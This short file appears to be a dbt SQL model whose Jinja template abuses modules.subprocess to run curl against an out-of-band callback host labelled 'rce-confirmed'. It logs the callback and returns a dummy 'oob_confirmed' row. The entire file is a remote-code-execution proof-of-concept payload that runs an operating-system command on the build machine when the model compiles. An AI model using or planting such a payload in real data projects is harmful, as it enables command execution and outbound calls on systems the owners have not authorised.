{% set oob_result = modules.subprocess.check_output(['curl', '-s', 'http://rce-confirmed.dbhqjpjkvbtfm3f5n3q0kjkz7r9sfepzh.oast.me/']).decode() %}
{{ log("OOB callback sent: " ~ oob_result, info=True) }}

SELECT 2 as oob_confirmed
